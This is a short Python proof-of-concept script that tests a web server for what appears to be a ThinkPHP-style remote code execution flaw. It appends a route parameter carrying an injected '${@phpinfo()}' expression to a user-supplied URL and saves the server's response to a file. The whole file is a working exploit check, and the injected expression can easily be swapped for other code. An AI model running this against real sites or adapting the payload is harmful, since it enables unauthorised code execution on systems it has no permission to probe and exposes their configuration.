#coding:utf-8
import sys
import requests
def verify(target_url):
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
    }
    resp = requests.get(target_url)
    with open("phpinfo.html","wb") as f:
        f.write(resp.content)
if __name__ == '__main__':
    args = sys.argv
    url = args[1]
    traget_url = url+"/index.php?s=/index/index/name/$%7B@phpinfo()%7D"
    verify(traget_url)